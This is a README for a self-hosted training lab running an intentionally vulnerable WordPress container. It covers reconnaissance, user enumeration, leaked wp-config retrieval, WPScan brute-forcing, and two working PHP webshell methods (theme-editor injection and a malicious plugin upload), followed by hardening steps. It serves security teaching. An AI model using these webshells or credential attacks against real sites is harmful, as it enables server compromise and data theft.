# Vulnerable WordPress Lab: CMS Security & Penetration Testing

## Overview

**WordPress** powers over 40% of all websites globally, making it one of the highest-value targets for attackers and bug bounty hunters. Security failures in WordPress typically arise from outdated core versions, unpatched third-party plugins and themes, exposed sensitive files (like backup `wp-config.php` files), enabled XML-RPC APIs vulnerable to brute-force and amplification, and administrative interface compromise leading to remote code execution (RCE).

This lab provides an intentionally vulnerable WordPress environment created for security auditing, penetration testing exercises, and automated/manual reconnaissance workflows.

- **Target URL**: [http://localhost:8107](http://localhost:8107)
- **Container Name**: `cyberlab_vulnerable_wordpress`
- **Docker Image**: `wpscanteam/vulnerablewordpress`
- **Directory**: `Classes/02_web_penetration_tester/12_cms_security/vulnerable_wordpress`
- **Lab Shortcut**: `./lab start wordpress`

---

## Architecture & Threat Vectors

```
                                    +-----------------------------------------+
                                    |         Attacker (Burp / WPScan)        |
                                    +--------------------+--------------------+
                                                         |
                   +-------------------------------------+-------------------------------------+
                   |                                     |                                     |
                   v                                     v                                     v
       [ 1. Passive / Active Recon ]         [ 2. User & Creds Enumeration ]       [ 3. Vulnerability Exploitation ]
       - Generator Meta Tag                  - WP REST API (/wp-json/wp/v2/users)  - Leaked wp-config.txt / backups
       - readme.html & license.txt           - Author archives (?author=1)         - searchreplacedb2.php exposure
       - RSS / Atom feed headers             - XML-RPC (wp.getUsersBlogs)          - Vulnerable plugins / themes
                                                         |                                     |
                                                         +------------------+------------------+
                                                                            v
                                                             [ 4. Post-Auth Webshell RCE ]
                                                             - Theme Editor Injection (404.php)
                                                             - Malicious ZIP Plugin Upload
```

---

## Lab Execution & Quick Start

```bash
# Navigate to the lab directory
cd Classes/02_web_penetration_tester/12_cms_security/vulnerable_wordpress

# Launch the lab
docker compose up -d

# Verify container is healthy and responding
curl -I http://localhost:8107/
```

Access [http://localhost:8107](http://localhost:8107) in your browser.

---

## Step-by-Step Penetration Testing Exercises

### Exercise 1: WordPress Reconnaissance & Fingerprinting

Identify the underlying WordPress version and server technologies:

1. **Inspect HTML Source**:
   Look for the generator meta tag in the HTML `<head>`:
   ```html
   <meta name="generator" content="WordPress 4.x" />
   ```
2. **Inspect Core Information Files**:
   ```bash
   # Check for standard WordPress documentation files
   curl -s http://localhost:8107/readme.html | grep -i "version"
   curl -s http://localhost:8107/license.txt
   ```
3. **Inspect RSS Feed Headers**:
   ```bash
   curl -s http://localhost:8107/feed/ | grep "<generator>"
   ```

---

### Exercise 2: User Enumeration (REST API & XML-RPC)

Attacking credentials begins with identifying valid usernames to avoid blind brute forcing:

1. **WP REST API Enumeration**:
   WordPress exposes user metadata publicly by default via the JSON API:
   ```bash
   curl -s http://localhost:8107/wp-json/wp/v2/users | jq '.[].slug'
   ```
2. **Author Archive Redirection**:
   Querying `?author=N` causes WordPress to redirect to the author's slug/username:
   ```bash
   curl -s -I "http://localhost:8107/?author=1" | grep -i "Location:"
   curl -s -I "http://localhost:8107/?author=2" | grep -i "Location:"
   ```
3. **XML-RPC Method Discovery & Enumeration**:
   Check if `/xmlrpc.php` is enabled:
   ```bash
   curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://localhost:8107/xmlrpc.php
   ```
   If `wp.getUsersBlogs` is present, it can be used for rapid multicall credential spraying.

---

### Exercise 3: Sensitive File & wp-config Leakage

Developers and administrators frequently leave text backups or editor artifacts in the web root:

1. **Verify Leaked wp-config Text Backup**:
   ```bash
   curl -s http://localhost:8107/wp-config.txt | head -n 30
   ```
   Observe the leaked database credentials (`DB_NAME`, `DB_USER`, `DB_PASSWORD`), table prefix, and cryptographic salts (`AUTH_KEY`, `SECURE_AUTH_KEY`).
2. **Check Other Common Editor Backups**:
   ```bash
   curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8107/wp-config.php~
   curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8107/wp-config.php.save
   curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8107/wp-config.old
   ```
3. **Exposed Database Management Scripts**:
   Verify exposure of the unauthenticated database migration utility `searchreplacedb2.php`:
   ```bash
   curl -I http://localhost:8107/searchreplacedb2.php
   ```
   Open [http://localhost:8107/searchreplacedb2.php](http://localhost:8107/searchreplacedb2.php) in your browser. This tool allows direct arbitrary SQL modifications and database credential disclosure.

---

### Exercise 4: Automated Scanning with WPScan

Run the industry standard tool **WPScan** against the target:

```bash
# Basic scan to enumerate plugins, themes, and users
wpscan --url http://localhost:8107 --enumerate u,vp,vt

# Aggressive plugin detection
wpscan --url http://localhost:8107 --plugins-detection aggressive

# Target XML-RPC authentication brute forcing once username is identified
wpscan --url http://localhost:8107 -U admin -P /usr/share/wordlists/rockyou.txt
```

---

### Exercise 5: Gaining Remote Code Execution (RCE) via Webshell

Once administrator credentials are recovered (via brute-forcing, leaked database passwords, or default setup):

#### Method A: Theme Editor Code Injection
1. Log in to `/wp-admin/` with administrator privileges.
2. Navigate to **Appearance -> Theme Editor** (or **Editor**).
3. Select an existing theme template that can be triggered directly, such as `404.php` or `header.php`.
4. Inject a lightweight PHP command execution payload at the top:
   ```php
   <?php
   if(isset($_REQUEST['cmd'])){
       system($_REQUEST['cmd']);
       die();
   }
   ?>
   ```
5. Click **Update File**.
6. Trigger code execution:
   ```bash
   curl "http://localhost:8107/wp-content/themes/twentyfourteen/404.php?cmd=id;uname+-a"
   ```

#### Method B: Malicious ZIP Plugin Upload
1. Create a malicious plugin directory:
   ```bash
   mkdir -p /tmp/evil_plugin
   cat << 'EOF' > /tmp/evil_plugin/evil.php
   <?php
   /**
    * Plugin Name: CyberLab Pentest Payload
    * Version: 1.0
    * Author: RedTeam
    */
   if (isset($_GET['shell'])) {
       system($_GET['shell']);
       exit;
   }
   ?>
   EOF
   cd /tmp && zip -r evil_plugin.zip evil_plugin/
   ```
2. Navigate to **Plugins -> Add New -> Upload Plugin**.
3. Upload `evil_plugin.zip` and click **Activate Plugin**.
4. Execute commands via the webshell:
   ```bash
   curl "http://localhost:8107/wp-content/plugins/evil_plugin/evil.php?shell=cat+/etc/passwd"
   ```

---

## Defensive Countermeasures & Hardening

1. **Disable XML-RPC**:
   Block all traffic to `/xmlrpc.php` at the web server / reverse proxy layer or via `.htaccess`:
   ```apache
   <Files xmlrpc.php>
       order deny,allow
       deny from all
   </Files>
   ```
2. **Disable In-Dashboard File Editing**:
   Add this directive to `wp-config.php` to prevent theme/plugin code modification even if admin is compromised:
   ```php
   define('DISALLOW_FILE_EDIT', true);
   define('DISALLOW_FILE_MODS', true);
   ```
3. **Restrict REST API User Enumeration**:
   Require authentication for user endpoint queries or disable user listing routes for unauthenticated users.
4. **Prevent Backup File Exposure**:
   Ensure web server configurations block access to `.txt`, `.save`, `.bak`, `.old`, and `~` files in the web root.

---

## Verified YouTube Walkthroughs & Solving Guides

All videos verified active via YouTube oEmbed API (`HTTP 200 OK`):

- [HackerSploit - WordPress Vulnerability Scanning With WPScan](https://www.youtube.com/watch?v=sQ4TtFdaiRA) — Comprehensive tutorial on reconnaissance, plugin enumeration, and brute forcing using WPScan.
- [Red Team Methods - Hacking WordPress servers - moving from Admin Page access to reverse shell inside the server!](https://www.youtube.com/watch?v=F8K99Sn_dsM) — Hands-on demonstration of pivoting from admin dashboard access to PHP webshell and interactive reverse shell.
- [Cyb3rak - WPScan Explained Like a Hacker | WordPress Pentesting Tutorial (Kali Linux)](https://www.youtube.com/watch?v=CuR2BXCE0LY) — Deep dive into WPScan syntax, flags, aggressive detection, and enumeration.
- [GetCyber - WPScan Hacks... Dominate Your WordPress Pentesting in Kali Linux](https://www.youtube.com/watch?v=9gwyj4frqwc) — Real-world scanning techniques and tips for offensive WordPress security assessments.

---

## Quick CLI Control
From the `cyber_lab` root directory:
```bash
# Start WordPress lab
./lab start wordpress

# Check status
./lab status

# Open interactive container shell
./lab shell wordpress

# Stop the lab
./lab stop wordpress
```
